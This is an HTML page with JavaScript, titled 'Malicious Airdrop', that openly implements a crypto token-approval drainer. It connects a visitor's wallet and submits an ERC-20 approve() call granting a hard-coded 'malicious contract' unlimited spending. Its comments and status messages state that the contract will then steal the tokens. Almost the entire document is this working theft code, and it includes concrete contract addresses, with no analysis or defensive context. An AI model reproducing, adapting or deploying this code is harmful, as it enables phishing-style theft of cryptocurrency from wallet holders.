<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malicious Airdrop</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
</head>
<body>
    <h1>Malicious Token Airdrop</h1>

    <button id="connectWallet">Connect Wallet</button>
    <br>
    <label for="victimAddress">Victim's Address:</label>
    <input type="text" id="victimAddress" placeholder="Enter Victim Address">
    <br>
    <button id="approveTokens">Approve Unlimited Token Spending</button>

    <div id="status"></div>

    <script>
        let web3;
        let accounts;
        const maliciousContractAddress = '0xb32201C09796d9664ee353383B6405515fDc050a';
        const tkkTokenAddress = '0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4';

        const tkkTokenABI = [
            {
                "inputs": [
                    { "internalType": "address", "name": "spender", "type": "address" },
                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
                ],
                "name": "approve",
                "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        window.addEventListener('load', function () {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);
                document.getElementById('connectWallet').addEventListener('click', connectWallet);
                document.getElementById('approveTokens').addEventListener('click', approveTokens);
            } else {
                alert('Please install MetaMask!');
            }
        });

        async function connectWallet() {
            accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            document.getElementById('status').innerText = `Connected: ${accounts[0]}`;
        }

        async function approveTokens() {
            const victimAddress = document.getElementById('victimAddress').value;

            if (!victimAddress) {
                alert('Please provide the victim address.');
                return;
            }

            try {
                const tokenContract = new web3.eth.Contract(tkkTokenABI, tkkTokenAddress);
                
                // Approve the malicious contract to spend unlimited tokens
                const approveTx = await tokenContract.methods
                    .approve(maliciousContractAddress, web3.utils.toWei('1000000000000000000', 'ether')) // Unlimited tokens
                    .send({ from: victimAddress });

                document.getElementById('status').innerText = `Tokens approved! Transaction: ${approveTx.transactionHash}`;

                // After this approval, the malicious contract will automatically steal the tokens
                document.getElementById('status').innerText += '\nNow the malicious contract can steal the tokens!';
            } catch (error) {
                document.getElementById('status').innerText = `Error: ${error.message}`;
            }
        }
    </script>
</body>
</html>

